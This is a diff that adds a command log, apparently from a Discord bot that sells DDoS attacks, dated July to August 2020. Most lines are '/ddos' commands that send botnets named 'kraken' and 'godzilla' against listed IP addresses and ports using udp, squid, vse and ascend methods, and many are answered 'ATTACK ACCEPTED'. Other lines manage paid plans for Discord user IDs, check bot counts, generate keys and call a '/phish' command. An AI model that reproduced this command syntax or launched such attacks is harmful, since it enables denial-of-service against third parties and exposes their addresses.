@@ -1,0 +1,188 @@
+/getbots godzilla
+/
+/plan
+/getbots godzilla
+/admin
+/getbots kraken
+/getbots godzilla
+/hulu
+/methods
+/http 51.75.191.190 30 domain=IP conns=500
+/ddos http 51.75.191.190 30 domain=IP conns=500
+/methods
+/getbots kraken
+/methods
+/methods
+/ddos squid 73.225.168.70 80 120
+/ddos kraken squid 98.194.246.216 120
+/getbots kraken
+/ddos godzilla vse 20.50.250.127 120 30028
+/plan
+/increaseplan <@692228920451399750> 15d
+/serverinfo
+/getbots kraken
+/decreaseplan
+/getlog 692228920451399750
+/decreaseplan <@692228920451399750> 1d
+/admin
+/
+/generatekeys trial 1
+/serverinfo
+/getbots kraken
+/getlog 718689080065654785
+/ddos
+/vpn
+/getlog 277500960065060864
+/ddos godzilla udp 117.27.239.28 30 80
+/checkip 117.27.239.28
+/getbots kraken
+/getbots godzilla
+/checkip 117.27.239.28
+/ddos Godzilla udp 117.27.239.28 60 80
+/getplan 733410388229488691
+/getbots godzilla
+/ddos Godzilla udp 117.27.239.28 60
+/ping 92.28.234.3
+/getplan <@569215642062815256>
+/getlogs 735988085749317672
+/admin
+/getlog 718689080065654785
+/getlogs 736055652736303104
+/admin
+/getlog 736055652736303104
+/getlog 569215642062815256
+/decreaseplan <@569215642062815256> 1d
+/getlog 569215642062815256
+/ping 51.161.107.174
+/ddos Godzilla UDP 117.27.239.28 30
+/getplan 679762231541366797
+/changeplan <@679762231541366797> 0
+/anal
+/ping 8.20.122.9
+/getlog 128.116.42.15
+/getlog 175019224656248832
+/getlog 718689080065654785
+/getplan 175019224656248832
+/ddos godzilla udp 24.118.205.222 1
+/getbots godzilla
+/getlog 692228920451399750
+/getbot kraken
+/getbots kraken
+/checkservers
+/getlog 175019224656248832
+/getlog 175019224656248832
+/decreaseplan <@175019224656248832> 1d
+/getlog 175019224656248832
+/getlog 17501922465624883
+/getlog 175019224656248832
+[Wed Jul 29 2020 22:18:28 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Wed Jul 29 2020 22:20:03 GMT-1100 (Samoa Standard Time)] /ping 73.161.102.253
+[Thu Jul 30 2020 04:30:05 GMT-1100 (Samoa Standard Time)] /getlog 175019224656248832
+[Thu Jul 30 2020 20:08:21 GMT-1100 (Samoa Standard Time)] /serverinfo
+[Fri Jul 31 2020 07:31:31 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Sat Aug 01 2020 06:33:11 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Tue Aug 04 2020 15:55:01 GMT-1100 (Samoa Standard Time)] /checkservers
+[Wed Aug 05 2020 05:18:59 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Wed Aug 05 2020 16:28:08 GMT-1100 (Samoa Standard Time)] /getplans
+[Wed Aug 05 2020 16:28:17 GMT-1100 (Samoa Standard Time)] /admin
+[Wed Aug 05 2020 16:28:36 GMT-1100 (Samoa Standard Time)] /planusers
+[Wed Aug 05 2020 16:28:50 GMT-1100 (Samoa Standard Time)] /eliteusers
+[Sat Aug 08 2020 17:53:10 GMT-1100 (Samoa Standard Time)] /getbots godzilla
+[Sat Aug 08 2020 18:44:38 GMT-1100 (Samoa Standard Time)] /ddos godzilla udp 117.27.239.28 80 30
+[Sun Aug 09 2020 05:55:17 GMT-1100 (Samoa Standard Time)] /plan
+[Sun Aug 09 2020 18:33:48 GMT-1100 (Samoa Standard Time)] /ddos godzilla udp 66.176.196.7 60 500
+[Sun Aug 09 2020 18:36:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.176.196.7 300 500
+[Mon Aug 10 2020 09:56:53 GMT-1100 (Samoa Standard Time)] /boi
+[Mon Aug 10 2020 09:57:19 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 10 2020 10:02:05 GMT-1100 (Samoa Standard Time)] /checkip 69.69.69.69
+[Mon Aug 10 2020 13:51:30 GMT-1100 (Samoa Standard Time)] /ddos Godzilla VSE 46.251.234.84 119 10026
+[Wed Aug 12 2020 02:43:06 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 117.27.239.28 80 30
+[Wed Aug 12 2020 02:43:06 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Wed Aug 12 2020 02:44:19 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Wed Aug 12 2020 02:44:44 GMT-1100 (Samoa Standard Time)] /getbots godzilla
+[Wed Aug 12 2020 02:45:07 GMT-1100 (Samoa Standard Time)] /getbots godzilla
+[Wed Aug 12 2020 02:49:56 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 117.27.239.28 30 80
+[Wed Aug 12 2020 02:49:56 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Wed Aug 12 2020 12:42:41 GMT-1100 (Samoa Standard Time)] /getplan <@558119105815642112>
+[Wed Aug 12 2020 12:42:55 GMT-1100 (Samoa Standard Time)] /changeplan <@558119105815642112> 2
+[Wed Aug 12 2020 12:43:22 GMT-1100 (Samoa Standard Time)] /increaseplan <@558119105815642112> 30d
+[Wed Aug 12 2020 12:43:26 GMT-1100 (Samoa Standard Time)] /getplan <@558119105815642112>
+[Wed Aug 12 2020 12:43:43 GMT-1100 (Samoa Standard Time)] /changeplan <@558119105815642112> 3
+[Wed Aug 12 2020 12:43:49 GMT-1100 (Samoa Standard Time)] /getplan <@558119105815642112>
+[Thu Aug 13 2020 14:40:19 GMT-1100 (Samoa Standard Time)] /phish yomom
+[Thu Aug 13 2020 20:52:09 GMT-1100 (Samoa Standard Time)] /methods
+[Fri Aug 14 2020 08:11:28 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Fri Aug 14 2020 11:52:42 GMT-1100 (Samoa Standard Time)] /methods
+[Fri Aug 14 2020 11:53:28 GMT-1100 (Samoa Standard Time)] /ddos godzilla ascend 117.27.239.28 8030
+[Fri Aug 14 2020 11:53:41 GMT-1100 (Samoa Standard Time)] /ddos godzilla ascend 117.27.239.28 30 80
+[Fri Aug 14 2020 11:54:34 GMT-1100 (Samoa Standard Time)] /ddos godzilla ascend 117.27.239.28 30 80
+[Fri Aug 14 2020 11:55:40 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 117.27.239.28 30 80
+[Fri Aug 14 2020 11:55:40 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Fri Aug 14 2020 12:01:52 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 117.27.239.28 30 80
+[Fri Aug 14 2020 12:01:52 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Fri Aug 14 2020 13:05:07 GMT-1100 (Samoa Standard Time)] /lap
+[Fri Aug 14 2020 13:05:11 GMT-1100 (Samoa Standard Time)] /lag
+[Fri Aug 14 2020 13:05:30 GMT-1100 (Samoa Standard Time)] /getplan <@618291885768704000>
+[Fri Aug 14 2020 13:33:46 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Fri Aug 14 2020 17:07:34 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Sun Aug 16 2020 05:50:05 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Sun Aug 16 2020 05:50:24 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Sun Aug 16 2020 09:51:18 GMT-1100 (Samoa Standard Time)] /ddos
+[Sun Aug 16 2020 12:05:26 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Mon Aug 17 2020 10:29:21 GMT-1100 (Samoa Standard Time)] /changeplan <@745022883536961647> 3
+[Mon Aug 17 2020 10:29:33 GMT-1100 (Samoa Standard Time)] /increaseplan <@745022883536961647> 60d
+[Mon Aug 17 2020 10:29:41 GMT-1100 (Samoa Standard Time)] /getplan <@745022883536961647>
+[Mon Aug 17 2020 10:30:44 GMT-1100 (Samoa Standard Time)] /decreaseplan <@745022883536961647> 20d
+[Mon Aug 17 2020 10:31:15 GMT-1100 (Samoa Standard Time)] /decreaseplan <@745022883536961647> 10d
+[Mon Aug 17 2020 18:26:51 GMT-1100 (Samoa Standard Time)] /getlog 701879552556925060
+[Mon Aug 17 2020 18:26:54 GMT-1100 (Samoa Standard Time)] /getlogs 701879552556925060
+[Mon Aug 17 2020 20:34:57 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 17 2020 20:38:26 GMT-1100 (Samoa Standard Time)] /getlog 701879552556925060
+[Tue Aug 18 2020 06:18:07 GMT-1100 (Samoa Standard Time)] /plan
+[Tue Aug 18 2020 08:48:23 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Tue Aug 18 2020 09:09:43 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Tue Aug 18 2020 09:25:54 GMT-1100 (Samoa Standard Time)] /getplan <@510553001249996810>
+[Tue Aug 18 2020 14:12:47 GMT-1100 (Samoa Standard Time)] /changeplan <@743633361733550160> 3
+[Tue Aug 18 2020 14:13:00 GMT-1100 (Samoa Standard Time)] /increase plan <@743633361733550160> 30d
+[Tue Aug 18 2020 14:13:10 GMT-1100 (Samoa Standard Time)] /increaseplan <@743633361733550160> 30d
+[Tue Aug 18 2020 14:13:33 GMT-1100 (Samoa Standard Time)] /decreaseplan <@743633361733550160> 30d
+[Wed Aug 19 2020 09:44:19 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 73.153.122.220 120 80
+[Wed Aug 19 2020 09:44:19 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Wed Aug 19 2020 10:05:10 GMT-1100 (Samoa Standard Time)] /getlog 745022883536961647
+[Wed Aug 19 2020 15:01:13 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Wed Aug 19 2020 15:46:10 GMT-1100 (Samoa Standard Time)] /ddos kraken udp 122.150.81.159 300 80
+[Wed Aug 19 2020 15:46:10 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 20 2020 05:32:07 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Thu Aug 20 2020 19:19:40 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Fri Aug 21 2020 02:49:22 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 117.27.239.28 30 80
+[Fri Aug 21 2020 02:49:22 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Fri Aug 21 2020 02:55:55 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 117.27.239.28 30 80
+[Fri Aug 21 2020 02:55:55 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Fri Aug 21 2020 04:20:49 GMT-1100 (Samoa Standard Time)] /elite
+[Fri Aug 21 2020 04:20:58 GMT-1100 (Samoa Standard Time)] /eliteusers
+[Fri Aug 21 2020 06:43:18 GMT-1100 (Samoa Standard Time)] /ddos godzilla ascend 117.27.239.28 30 80
+[Fri Aug 21 2020 06:46:24 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 117.27.239.28 30 80
+[Fri Aug 21 2020 06:46:24 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Fri Aug 21 2020 08:31:02 GMT-1100 (Samoa Standard Time)] /ddos godzilla ascend 18.181.115.9 30 443
+[Fri Aug 21 2020 08:31:02 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Sun Aug 23 2020 07:08:32 GMT-1100 (Samoa Standard Time)] /getlogs /getlog 609725906637815814
+[Sun Aug 23 2020 07:08:37 GMT-1100 (Samoa Standard Time)] /getlogs 609725906637815814
+[Sun Aug 23 2020 07:08:51 GMT-1100 (Samoa Standard Time)] /getlog 609725906637815814
+[Sun Aug 23 2020 07:09:35 GMT-1100 (Samoa Standard Time)] /getplan /getlog 609725906637815814
+[Sun Aug 23 2020 07:09:42 GMT-1100 (Samoa Standard Time)] /getplan 609725906637815814
+[Sun Aug 23 2020 07:12:43 GMT-1100 (Samoa Standard Time)] /changeplan 609725906637815814 0
+[Sun Aug 23 2020 07:12:51 GMT-1100 (Samoa Standard Time)] /getplan 609725906637815814
+[Sun Aug 23 2020 08:24:48 GMT-1100 (Samoa Standard Time)] /getplan 714247184622813224
+[Tue Aug 25 2020 09:52:57 GMT-1100 (Samoa Standard Time)] /methods
+[Wed Aug 26 2020 05:55:27 GMT-1100 (Samoa Standard Time)] /ddos
+[Wed Aug 26 2020 09:57:55 GMT-1100 (Samoa Standard Time)] /checkservers
+[Wed Aug 26 2020 10:43:39 GMT-1100 (Samoa Standard Time)] /ddos
+[Wed Aug 26 2020 10:56:47 GMT-1100 (Samoa Standard Time)] /captcha
+[Wed Aug 26 2020 19:48:23 GMT-1100 (Samoa Standard Time)] /checkservers
+[Thu Aug 27 2020 00:12:16 GMT-1100 (Samoa Standard Time)] /changeplan <@576595161610452999> 3
+[Thu Aug 27 2020 00:12:39 GMT-1100 (Samoa Standard Time)] /getplan <@576595161610452999>
+[Thu Aug 27 2020 00:13:09 GMT-1100 (Samoa Standard Time)] /increaseplan <@576595161610452999> 20d
+[Thu Aug 27 2020 20:13:28 GMT-1100 (Samoa Standard Time)] /plan
+[Thu Aug 27 2020 20:13:45 GMT-1100 (Samoa Standard Time)] /copperusers
+[Thu Aug 27 2020 20:14:13 GMT-1100 (Samoa Standard Time)] /plan
+[Thu Aug 27 2020 20:14:59 GMT-1100 (Samoa Standard Time)] /planusers 1
